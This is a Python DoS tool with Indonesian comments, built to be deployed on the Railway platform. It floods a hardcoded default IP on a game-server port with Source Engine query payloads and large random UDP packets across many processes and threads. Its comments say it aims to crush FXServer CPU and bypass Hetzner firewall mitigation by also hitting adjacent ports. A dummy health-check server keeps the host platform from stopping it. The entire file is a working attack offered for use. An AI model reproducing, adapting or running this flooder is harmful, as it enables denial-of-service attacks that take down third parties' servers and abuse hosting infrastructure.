import multiprocessing
import threading
import socket
import random
import os
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

# --- CONFIG DARI VARIABLES RAILWAY ---
# Gunakan Default value agar tidak error jika variable belum diset
target_ip = os.getenv("TARGET_IP", "62.146.239.123")
target_port = int(os.getenv("TARGET_PORT", "30120"))
num_processes = int(os.getenv("PROCES", "50")) 
threads_per_proc = int(os.getenv("THREADS", "10"))
port_http = int(os.getenv("PORT", "8080")) # Port wajib Railway

# Payload khusus buat hancurin CPU FXServer & Amplifikasi bandwidth
PAYLOADS = [
    b'\xff\xff\xff\xffTSource Engine Query\x00',
    b'\xff\xff\xff\xffgetstatus',
    b'\xff\xff\xff\xffgetinfo',
    b'\xff\xff\xff\xffU\xff\xff\xff\xff', # A2S_PLAYER Amplified
    b'\xff\xff\xff\xff\x56', # A2S_GETFREEPAGE
    b'\xff\xff\xff\xffdetails',
]

def power_flood(ip, port):
    # Inisialisasi socket dengan buffer besar
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096 * 1024)
    except:
        pass
    
    # Paket Gendut (MTU 1330 sesuai log Railway kamu biar efektif)
    heavy_packet = random._urandom(1330)
    
    while True:
        try:
            # 1. Tembak Port Utama (Game Port)
            s.sendto(random.choice(PAYLOADS), (ip, port))
            s.sendto(heavy_packet, (ip, port))
            
            # 2. Teknik Bypass Firewall (Hajar port sekitar)
            # Ini biar mitigasi Hetzner/ZAP kewalahan
            if random.random() > 0.6:
                side_port = random.choice([port-1, port+1, port+10, 80, 443])
                s.sendto(heavy_packet, (ip, side_port))
        except:
            # Jika socket error, buat baru
            time.sleep(0.1)
            break

def worker_logic(ip, port, threads):
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=power_flood, args=(ip, port), daemon=True)
        t.start()
        threads_list.append(t)
    
    # Biar thread tetap hidup
    while True:
        time.sleep(10)

# --- DUMMY SERVER BIAR RAILWAY HAPPY ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"VSE V4 EXTREME ENGINE IS RUNNING")

    def log_message(self, format, *args):
        return # Biar log gak penuh sama traffic healthcheck

def run_http_server():
    server_address = ('0.0.0.0', port_http)
    httpd = HTTPServer(server_address, HealthCheckHandler)
    print(f"[*] Dummy Server started on port {port_http}")
    httpd.serve_forever()

# --- MAIN ENGINE ---
if __name__ == "__main__":
    print(f"{'='*45}")
    print(f"   VSE ULTIMATE V4 - HIGH PENETRATION")
    print(f"{'='*45}")
    print(f"[*] Target IP   : {target_ip}")
    print(f"[*] Target Port : {target_port}")
    print(f"[*] Power       : {num_processes} Proc x {threads_per_proc} Threads")
    print(f"[*] Status      : Injecting Traffic...")
    
    # 1. Jalankan Dummy HTTP Server (Wajib di Railway)
    threading.Thread(target=run_http_server, daemon=True).start()

    # 2. Jalankan Pasukan Serangan
    processes = []
    for _ in range(num_processes):
        p = multiprocessing.Process(target=worker_logic, args=(target_ip, target_port, threads_per_proc))
        p.daemon = True
        p.start()
        processes.append(p)

    # Menjaga proses utama tetap hidup
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Serangan dihentikan oleh user.")
        for p in processes:
            p.terminate()
